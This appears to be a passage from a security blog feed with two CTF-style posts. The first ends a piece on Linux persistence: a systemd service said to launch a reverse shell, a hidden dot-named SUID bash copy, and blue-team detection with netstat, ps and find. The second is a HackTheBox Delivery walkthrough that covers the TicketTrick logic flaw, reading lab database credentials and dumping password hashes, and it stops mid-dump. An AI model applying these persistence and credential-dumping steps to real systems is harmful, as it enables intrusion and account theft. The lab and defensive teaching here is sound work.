WantedBy=multi-user.target&#39;
</code></pre></div><p>When the service is started, it launches a reverse shell to the attacker.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@pinkys-palace:/etc/systemd/system# systemctl start backdoor.service
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210526013637397.png" alt="image-20210526013637397"  /></div>
</p>
<p>It can be enabled on boot too.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@pinkys-palace:/etc/systemd/system# systemctl enable backdoor.service
</code></pre></div><h3 id="7-suid">7. SUID</h3>
<p>The last one on this post is SUID.</p>
<p>As an example, I can make a copy of bash called <code>.backdoor</code> (notice the dot) to a low privilege user but has been compromised,  and then set SUID permission on it.</p>
<p><div class="img-container"><img src="imgs/image-20210526020936681.png" alt="image-20210526020936681"  /></div>
</p>
<p>Why do I add dot?</p>
<p>Well, this is based on my observation on some people out there. They tend to just use <code>ls -l</code> rather than <code>ls -la</code>, and this becomes an advantage for attackers to put a backdoor with a dot.</p>
<p>It’s not just about SUID though, it applies to other backdoors as well (<em>cough</em> and <code>.git</code> folder <em>cough</em>)</p>
<h2 id="blue-team-side">Blue Team side</h2>
<p>Before reading further, I’ll state that if your server (irl) gets hacked, it’s better to restore the server’s backup or completely rebuild it from scratch, because in the real world, those backdoors can be obfuscated and combined with other techniques (not to mention there might be a rootkit too), which makes it difficult to detect/find.</p>
<p>Also what I share here might not be that effective but, but here is how I usually deal with those backdoors in attack-defense CTF.</p>
<h3 id="ssh-keys-and-bashrc">SSH keys and .bashrc.</h3>
<p>Make sure to regularly check the all the users <code>authorized_keys</code> file.</p>
<p>In the image below, there is a public key with a foreign hostname <code>kali</code> instead of <code>pinkys-palace</code>, then you should suspect it.</p>
<p><div class="img-container"><img src="imgs/image-20210605091730851.png" alt="image-20210605091730851"  /></div>
</p>
<p>Well, actually, the attackers might have tricked it to look like it was a legitimate one.</p>
<p>My workaround here is why don’t we create a ‘skeleton’ file of all the <code>authorized_keys</code> files and set a Cronjob which automatically reverts those files back to its original state, and I might perform it remotely via <code>scp</code>. This can be applied as well to handle backdoor in <code>.bashrc</code> .</p>
<blockquote>
<p>You can find the skeleton file of <code>.bashrc</code> at <code>/etc/skel</code>.</p>
</blockquote>
<h3 id="ssh-motd">SSH motd</h3>
<p>It&rsquo;s not always placed on <code>/etc/update-motd.d</code> but make sure the <strong>motd</strong> directory is only writable by root, note the default list of <strong>motd</strong> files and apply the same thing as above (skeleton file) because attackers might have inserted backdoor in the original file.</p>
<p>We could also do some &lsquo;forensics&rsquo; using timestamp:</p>
<pre><code>root@MSI:/etc/update-motd.d# ls --full-time
</code></pre><p>For example, those files with the timestamp <code>000000000</code> (nano) in the image below have most likely not been modified and are still in their original state.</p>
<p><div class="img-container"><img src="imgs/image-20210605092751344.png" alt="image-20210605092751344"  /></div>
</p>
<p>After inserting a non-malicious line, the timestamp changed. From here, it&rsquo;s safe to assume that someone/something has modified it.</p>
<p><div class="img-container"><img src="imgs/image-20210605093121574.png" alt="image-20210605093121574"  /></div>
</p>
<h3 id="cronjobs-and-services">Cronjobs and Services</h3>
<p>I think monitoring the process using  <code>netstat</code> and <code>ps</code> command is enough for this. Anything that looks like a reverse shell or a bind shell is definitely suspicious.</p>
<p>To find an unwanted open port we can use this command:</p>
<pre><code>netstat -antp | grep LISTEN
</code></pre><p>To find a suspicious  connection we can use this command:</p>
<pre><code>netstat -antp | grep ESTABLISHED
</code></pre><p><div class="img-container"><img src="imgs/image-20210526034616621.png" alt="image-20210526034616621"  /></div>
</p>
<p>Sometimes the state of a backdoor is neither ESTABLISHED nor LISTEN but SYN_SENT. That happens because the backdoor tries to send a reverse shell out but the attacker didn’t catch or fail to catch it.</p>
<p>To find that, at the <code>grep</code> side, we can just change ESTABLISHED or LISTEN to SYN_SENT</p>
<pre><code>netstat -antp | grep SYN_SENT
</code></pre><p>There is also the <code>ps -f</code> command which is pretty good at visualizing the process tree. For example, here we know that the culprit that keeps opening the HTTPS port (443) is probably on <code>.bashrc</code> file because it gets triggered every time we launch a bash shell (interactive session).</p>
<p><div class="img-container"><img src="imgs/image-20210526034217561.png" alt="image-20210526034217561"  /></div>
</p>
<h3 id="finding-suid">Finding SUID</h3>
<p>To find some suspicious SUID we can use the <code>find</code> commands. It can also detect the SUID that started with dot!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@pinkys-palace:/etc/update-motd.d# find / -type f -perm 4755 2&gt;/dev/null
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210526035623660.png" alt="image-20210526035623660"  /></div>
</p>
<p>So that&rsquo;s all for today.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54">https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54</a></li>
<li><a href="https://blog.g0tmi1k.com/2011/08/kioptrix-level-3/">https://blog.g0tmi1k.com/2011/08/kioptrix-level-3/</a></li>
<li><a href="https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c">https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c</a></li>
<li><a href="https://gist.github.com/ahhh/1d4bf832c5a88cc75adb">https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li>
<li><a href="https://ippsec.rocks/?#">https://ippsec.rocks/?#</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Delivery</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-delivery/</link>
      <pubDate>Tue, 25 May 2021 05:36:18 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-delivery/</guid>
      <description>Exploiting a logic flaw called TicketTrick</description>
      <content:encoded><![CDATA[<p>Delivery from HackTheBox is all about exploiting a logic flaw called TicketTrick which was discovered by <a href="https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c">Inti De Ceukelaire</a>.</p>
<p>On this machine, there is a helpdesk ticketing system that gives an unauthenticated user a temporary email with a legitimate company domain. Using that email, I&rsquo;m able to register at Mattermost and gain access to the company private communication channel. The conversation in the channel leaks a set of SSH credentials and a password in which its variant is being used in the system. There is a set of database credentials in the Mattermost configuration file, which can be used to dump the password hash of the root account. After generating a variant of the exposed password with hashcat, I&rsquo;m able to crack the password and obtain root access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>TicketTrick</li>
<li>Generating wordlist using hashcat</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li><a href="https://hashcat.net/">hashcat</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> full TCP scan discovers three open ports: An SSH on port 22, an HTTP server on port 80, and an unknown service on port 8065</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «delivery» «10.10.14.70» 
$ nmap -p- --min-rate 1000 -sV --reason -oA nmap/10-tcp-allport-delivery 10.10.10.222 
Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 14:58 EDT
....
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 nginx 1.14.2
8065/tcp open  unknown syn-ack ttl 63
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8065-TCP:V=7.80%I=7%D=5/21%Time=60A80336%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request&#34;)%r(GetRequest,DF3,&#34;HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
....

→ root@kali «delivery» «10.10.14.70» 
$ nmap -p22,80,8065 --min-rate 1000 -sC --reason -oA nmap/10-tcp-allport-delivery 10.10.10.222
Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 15:06 EDT
Nmap scan report for 10.10.10.222
Host is up, received echo-reply ttl 63 (0.45s latency).

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    syn-ack ttl 63
|_http-title: Welcome
8065/tcp open  unknown syn-ack ttl 63
</code></pre></div><p>I can clearly see the fingerprint of port 8065 indicate that it&rsquo;s a HTTP server. I can confirm it with <code>curl</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70» 
$ curl -sI 10.10.10.222:8065
HTTP/1.1 <span style="color:#ae81ff">405</span> Method Not Allowed
Date: Fri, <span style="color:#ae81ff">21</span> May <span style="color:#ae81ff">2021</span> 19:09:14 GMT
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>This page is a static website.</p>
<p><div class="img-container"><img src="imgs/image-20210522022202624.png" alt="image-20210522022202624"  /></div>
</p>
<p>The text “HELPDESK” points to <code>http://helpdesk.delivery.htb/ </code>.  Clicking on the &ldquo;CONTACT US&rdquo; flips the homepage to this views:</p>
<p><div class="img-container"><img src="imgs/image-20210522022535948.png" alt="image-20210522022535948"  /></div>
</p>
<p>The text “MatterMost server” points to <code>http://delivery.htb:8065</code>.</p>
<p>I can use <code>curl</code> and <code>grep</code> command to grab all the links/URL from this page.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70» 
$ curl -s 10.10.10.222 | grep -Eo <span style="color:#e6db74">&#39;href=&#34;[^\&#34;]+&#34;&#39;</span> | grep -v <span style="color:#e6db74">&#39;#&#39;</span>
href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/css/main.css&#34;</span>
href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/css/ie9.css&#34;</span>
href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/css/noscript.css&#34;</span>
href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://helpdesk.delivery.htb&#34;</span>
href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://helpdesk.delivery.htb&#34;</span>
href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://delivery.htb:8065&#34;</span>
href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://html5up.net&#34;</span>
</code></pre></div><p>I’ll add the newly discovered hostnames to my <code>/etc/hosts</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70» 
$ echo <span style="color:#e6db74">&#39;10.10.10.222 delivery.htb helpdesk.delivery.htb&#39;</span> &gt; /etc/hosts
</code></pre></div><p>Before moving on, we can poke the hostnames and compare their page size to check if this site has different content when we visit it with a hostname.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70» 
$ curl -s http://10.10.10.222/ | wc -c
<span style="color:#ae81ff">10850</span>
→ root@kali «delivery» «10.10.14.70» 
$ curl -s http://delivery.htb/ | wc -c
<span style="color:#ae81ff">10850</span>
→ root@kali «delivery» «10.10.14.70» 
$ curl -s http://helpdesk.delivery.htb/ | wc -c
<span style="color:#ae81ff">4933</span>
</code></pre></div><p>There is only one page that has different in size.</p>
<p>I did a <code>gobuster</code> scan but find nothing useful in the results, so I&rsquo;ll move to the next prt.</p>
<h3 id="tcp-80---helpdeskdeliveryhtb">TCP 80 - helpdesk.delivery.htb</h3>
<p>There is a helpdesk ticketing system here. At the bottom of the page it shows it is powered by <a href="https://osticket.com/">osTicket</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210522024708233.png" alt="image-20210522024708233"  /></div>
</p>
<p>The &ldquo;Open a New Ticket&rdquo; menu.</p>
<p><div class="img-container"><img src="imgs/image-20210522025616599.png" alt="image-20210522025616599"  /></div>
</p>
<p>The &ldquo;Check Ticket Status&rdquo; menu.</p>
<p><div class="img-container"><img src="imgs/image-20210522025147588.png" alt="image-20210522025147588"  /></div>
</p>
<h4 id="open-a-new-ticket">Open a New Ticket</h4>
<p>According to the message at <code>http://delivery.htb/#contact-us</code>, guest user seems to be allowed to create a ticket here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">For unregistered users, please use our HelpDesk to get in touch with our team. 
Once you have an @delivery.htb email address, you&#39;ll be able to have access to our MatterMost server.
</code></pre></div><p>I&rsquo;ll create one.</p>
<p><div class="img-container"><img src="imgs/image-20210522030005601.png" alt="image-20210522030005601"  /></div>
</p>
<p>Once the ticket request is submitted, it notifies that the ticket has been created.</p>
<p><div class="img-container"><img src="imgs/image-20210522030208711.png" alt="image-20210522030208711"  /></div>
</p>
<p>Besides the ticket id, it also gives us a temporary email with domain of <code>delivery.htb</code>, and I&rsquo;ll note that:</p>
<ul>
<li>Ticket : 4709941</li>
<li>Email: <a href="mailto:4709941@delivery.htb">4709941@delivery.htb</a>.</li>
</ul>
<p>The created ticket can be accessed/viewed on “Check Ticket Status” menu.</p>
<p><div class="img-container"><img src="imgs/image-20210522030510810.png" alt="image-20210522030510810"  /></div>
</p>
<h3 id="finding-vulnerabilities---exploit-db">Finding vulnerabilities - Exploit-DB</h3>
<p>The app source code is available on Github: <a href="https://github.com/osTicket/osTicket">https://github.com/osTicket/osTicket</a>. But, it seems I&rsquo;ll need an admin access to find the version.</p>
<p>You guess it, we can limit the search based on the box release (9 January 2021):</p>
<p><div class="img-container"><img src="imgs/image-20210522031957741.png" alt="image-20210522031957741"  /></div>
</p>
<p>But those exploits mostly XSS that requires a user interaction and there is no indication for that in this box, so let’s move to the next one.</p>
<h3 id="tcp-8065--mattermost">TCP 8065 — Mattermost</h3>
<p>There is an instance of Mattermost here and it requires an account.</p>
<p><div class="img-container"><img src="imgs/image-20210522032634304.png" alt="image-20210522032634304"  /></div>
</p>
<p>Sign up is allowed, but the page clearly shows that valid email is required.</p>
<p><div class="img-container"><img src="imgs/image-20210522032749098.png" alt="image-20210522032749098"  /></div>
</p>
<p>And here is why a valid email is required, there is a verification process.</p>
<p><div class="img-container"><img src="imgs/image-20210522033006957.png" alt="image-20210522033006957"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-maildeliverer">Shell as maildeliverer</h3>
<h4 id="access-to-mattermost-using-tickettrick">Access to Mattermost using TicketTrick</h4>
<p>The idea of TicketTrick here is to use the temporary email address given by the support ticket system to register on Mattermost.</p>
<p>For me, the previous email is: <code>4709941@delivery.htb</code>. I’ll use that to register on Mattermost.</p>
<p><div class="img-container"><img src="imgs/image-20210522034638745.png" alt="image-20210522034638745"  /></div>
</p>
<p>The verification is sent to <code>4709941@delivery.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210522034704297.png" alt="image-20210522034704297"  /></div>
</p>
<p>Back on helpdesk, I can see the verification link to activate the my previously created Mattermost account.</p>
<p><div class="img-container"><img src="imgs/image-20210522034915465.png" alt="image-20210522034915465"  /></div>
</p>
<p>Visiting <code>http://delivery.htb:8065/do_verify_email?token=eoy11mus8h6m4hctpmwt9qw31cdsfcxzbg7noyc5gzpc6htp9e8mqe55wwewaju9&amp;email=4709941%40delivery.htb</code> redirects back to MatterMost which confirms the email has been verified.</p>
<p><div class="img-container"><img src="imgs/image-20210522035035109.png" alt="image-20210522035035109"  /></div>
</p>
<p>Upon logging in, I&rsquo;m able to join the Internal channel (like server on Discord). There is one channel called internal.</p>
<p><div class="img-container"><img src="imgs/image-20210522035330637.png" alt="image-20210522035330637"  /></div>
</p>
<p>The chats from root contain a set of credentials and a few hints which indicates that they use a variant password of “PleaseSubscribe!”.</p>
<h4 id="ssh---maildeliverer">SSH - maildeliverer</h4>
<p>The credentials of maildeliverer works on SSH.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «delivery» «10.10.14.70» 
$ ssh maildeliverer@delivery.htb
...
maildeliverer@delivery.htb&#39;s password: 
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

...
Last login: Fri May 21 14:11:23 2021 from 10.10.16.16
maildeliverer@Delivery:~$ id
uid=1000(maildeliverer) gid=1000(maildeliverer) groups=1000(maildeliverer)
</code></pre></div><p>The user flag is done here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">maildeliverer@Delivery:~$ ls -l
total 4
-r-------- 1 maildeliverer maildeliverer 33 May 21 11:21 user.txt
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210522040053221.png" alt="image-20210522040053221"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>Enumerating on <code>/opt</code> finds the Mattermost installation folder. The Mattermost config file contains the database credentials.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">maildeliverer@Delivery:/opt/mattermost/config$ cat config.json | grep SqlSetting -A10
    <span style="color:#e6db74">&#34;SqlSettings&#34;</span>: <span style="color:#f92672">{</span>
        <span style="color:#e6db74">&#34;DriverName&#34;</span>: <span style="color:#e6db74">&#34;mysql&#34;</span>,
        <span style="color:#e6db74">&#34;DataSource&#34;</span>: <span style="color:#e6db74">&#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&#34;</span>,
        <span style="color:#e6db74">&#34;DataSourceReplicas&#34;</span>: <span style="color:#f92672">[]</span>,
        <span style="color:#e6db74">&#34;DataSourceSearchReplicas&#34;</span>: <span style="color:#f92672">[]</span>,
        <span style="color:#e6db74">&#34;MaxIdleConns&#34;</span>: 20,
        <span style="color:#e6db74">&#34;ConnMaxLifetimeMilliseconds&#34;</span>: 3600000,
        <span style="color:#e6db74">&#34;MaxOpenConns&#34;</span>: 300,
        <span style="color:#e6db74">&#34;Trace&#34;</span>: false,
        <span style="color:#e6db74">&#34;AtRestEncryptKey&#34;</span>: <span style="color:#e6db74">&#34;n5uax3d4f919obtsp1pw1k5xetq1enez&#34;</span>,
        <span style="color:#e6db74">&#34;QueryTimeout&#34;</span>: 30,
</code></pre></div><p>The credentials is <code>mmuser:Crack_The_MM_Admin_PW</code>.</p>
<h4 id="mysql---dump-passwords">MySQL - Dump Passwords</h4>
<p>With database credentials, I can connect to the MySQL service.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql">maildeliverer<span style="color:#f92672">@</span>Delivery:<span style="color:#f92672">/</span>opt<span style="color:#f92672">/</span>mattermost<span style="color:#f92672">/</span>config<span style="color:#960050;background-color:#1e0010">$</span> mysql mattermost <span style="color:#f92672">-</span>u mmuser <span style="color:#f92672">-</span>pCrack_The_MM_Admin_PW
Reading <span style="color:#66d9ef">table</span> information <span style="color:#66d9ef">for</span> completion of <span style="color:#66d9ef">table</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">column</span> names
You can turn off this feature <span style="color:#66d9ef">to</span> get a quicker startup <span style="color:#66d9ef">with</span> <span style="color:#f92672">-</span>A

Welcome <span style="color:#66d9ef">to</span> the MariaDB monitor.  Commands end <span style="color:#66d9ef">with</span> ; <span style="color:#66d9ef">or</span> <span style="color:#960050;background-color:#1e0010">\</span>g.
Your MariaDB connection id <span style="color:#66d9ef">is</span> <span style="color:#ae81ff">395</span>
Server version: <span style="color:#ae81ff">10</span>.<span style="color:#ae81ff">3</span>.<span style="color:#ae81ff">27</span><span style="color:#f92672">-</span>MariaDB<span style="color:#f92672">-</span><span style="color:#ae81ff">0</span><span style="color:#f92672">+</span>deb10u1 Debian <span style="color:#ae81ff">10</span>

<span style="color:#a6e22e">Copyright</span> (c) <span style="color:#ae81ff">2000</span>, <span style="color:#ae81ff">2018</span>, Oracle, MariaDB Corporation Ab <span style="color:#66d9ef">and</span> others.

Type <span style="color:#e6db74">&#39;help;&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;\h&#39;</span> <span style="color:#66d9ef">for</span> help. Type <span style="color:#e6db74">&#39;\c&#39;</span> <span style="color:#66d9ef">to</span> clear the current input statement.

MariaDB [mattermost]<span style="color:#f92672">&gt;</span>
</code></pre></div><p>There is a users table which usually contains something juicy.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql">MariaDB [mattermost]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">show</span> <span style="color:#66d9ef">tables</span>;
<span style="color:#f92672">+------------------------+</span>
<span style="color:#f92672">|</span> Tables_in_mattermost   <span style="color:#f92672">|</span>
<span style="color:#f92672">+------------------------+</span>
...
<span style="color:#f92672">|</span> Users                  <span style="color:#f92672">|</span>
<span style="color:#f92672">+------------------------+</span>
<span style="color:#ae81ff">46</span> rows <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">001</span> sec)
</code></pre></div><p>I can get the columns of the table user by querying <code>describe Users;</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql">MariaDB [mattermost]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">describe</span> Users;
<span style="color:#f92672">+--------------------+--------------+------+-----+---------+-------+</span>
<span style="color:#f92672">|</span> Field              <span style="color:#f92672">|</span> Type         <span style="color:#f92672">|</span> <span style="color:#66d9ef">Null</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">Key</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">Default</span> <span style="color:#f92672">|</span> Extra <span style="color:#f92672">|</span>
<span style="color:#f92672">+--------------------+--------------+------+-----+---------+-------+</span>
<span style="color:#f92672">|</span> Id                 <span style="color:#f92672">|</span> <span style="color:#66d9ef">varchar</span>(<span style="color:#ae81ff">26</span>)  <span style="color:#f92672">|</span> NO   <span style="color:#f92672">|</span> PRI <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> CreateAt           <span style="color:#f92672">|</span> <span style="color:#66d9ef">bigint</span>(<span style="color:#ae81ff">20</span>)   <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span> MUL <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> UpdateAt           <span style="color:#f92672">|</span> <span style="color:#66d9ef">bigint</span>(<span style="color:#ae81ff">20</span>)   <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span> MUL <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> DeleteAt           <span style="color:#f92672">|</span> <span style="color:#66d9ef">bigint</span>(<span style="color:#ae81ff">20</span>)   <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span> MUL <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> Username           <span style="color:#f92672">|</span> <span style="color:#66d9ef">varchar</span>(<span style="color:#ae81ff">64</span>)  <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span> UNI <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> Password           <span style="color:#f92672">|</span> <span style="color:#66d9ef">varchar</span>(<span style="color:#ae81ff">128</span>) <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
...
<span style="color:#f92672">+--------------------+--------------+------+-----+---------+-------+</span>
<span style="color:#ae81ff">25</span> rows <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">001</span> sec)
</code></pre></div><p>I&rsquo;ll dump that the username and password columns from the table Users.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql">MariaDB [mattermost]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">select</span> Username,Password <span style="color:#66d9ef">from</span> Users;
<span style="color:#f92672">+----------------------------------+--------------------------------------------------------------+</span>
<span style="color:#f92672">|</span> Username                         <span style="color:#f92672">|</span> Password                                                     <span style="color:#f92672">|</span>
<span style="color:#f92672">+----------------------------------+--------------------------------------------------------------+</span>
<span style="color:#f92672">|</span> surveybot                        <span style="color:#f92672">|</span>                                                              <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> c3ecacacc7b94f909d04dbfd308a9b93 <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> <span style="color:#ae81ff">5</span>b785171bfb34762a933e127630c4860 <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">3</span>m0quqyvCE8Z<span style="color:#f92672">/</span>R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS<span style="color:#f92672">/</span>G <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> testmail                         <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>gSBaz3a76sX.ikqynx4E7O2NYn9.q6fcSopTwYP672lJMSbZ6.IQa <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> help                             <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>zsb4KbggZbpQi2Wa8W0.C.lHVJxiUBr6cyNFbDbWu11j6JBJrVkpm <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> root                             <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>VM6EeymRxJ29r8Wjkr8Dtev0O.<span style="color:#ae81ff">1</span>STWb4.<span style="color:#ae81ff">4</span>ScG.anuu7v0EFJwgjjO <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> ff0a21fc6fc2488195e16ea854c963ee <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> channelexport                    <span style="color:#f92672">|</span>                                                              <span style="color:#f92672">|</span>
